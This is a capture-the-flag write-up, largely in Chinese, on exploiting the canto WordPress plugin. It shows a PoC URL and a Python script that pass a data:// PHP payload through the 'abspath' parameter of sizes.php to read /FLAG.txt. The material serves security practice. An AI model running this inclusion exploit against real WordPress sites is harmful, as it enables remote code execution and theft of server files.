# X-034-24 Melodic Mayhem

> Your mission, should you choose to accept it, involves uncovering the secrets of a notorious CVE vulnerability. This challenge will take you on a journey through a vulnerable WordPress plugin. Your task is to identify its weak points and leverage them to execute a successful exploit and finally get the /FLAG.txt

直接访问首页可见 WordPress 站点（主题为 rock-tune，页面里能看到典型的 `wp-includes/`、`wp-content/` 资源）。

对常见路径进行手工/字典枚举：`/wp-content/plugins/`。发现插件目录中存在 `canto` 插件，并且其子路径下的库文件可以直接被 Web 访问，例如：`/wp-content/plugins/canto/includes/lib/sizes.php`

在一些弱配置环境中，PHP 可能开启 `allow_url_include = On`，从而允许通过 URL 包装器（如 `data://`）被 include/require。

通过对 `/wp-content/plugins/canto/includes/lib/sizes.php` 的测试，发现其存在一个 `abspath` 参数被用于引入 WordPress 环境（可直接访问且会执行）。

构造 `abspath` 为 `data://text/plain,<?php ... ?>` 形式，即可让服务器执行我们内联的 PHP 代码。为避免后续代码继续执行，payload 里在读取完 `FLAG` 后使用 `die();` 直接退出。

最终构造的 PoC：
```
http://ip32797/wp-content/plugins/canto/includes/lib/sizes.php?abspath=data://text/plain,%3C%3Fphp%20echo%20file_get_contents(%27/FLAG.txt%27);die();%20%3F%3E
```
![image.png](https://x/x12104908965.png)
## EXP
```python
import requests

u = "http://ip32797/wp-content/plugins/canto/includes/lib/sizes.php"
p = "<?php echo file_get_contents('/FLAG.txt');die(); ?>"
url = u + "?abspath=data://text/plain," + requests.utils.quote(p, safe='')
print(requests.get(url, timeout=5).text)
```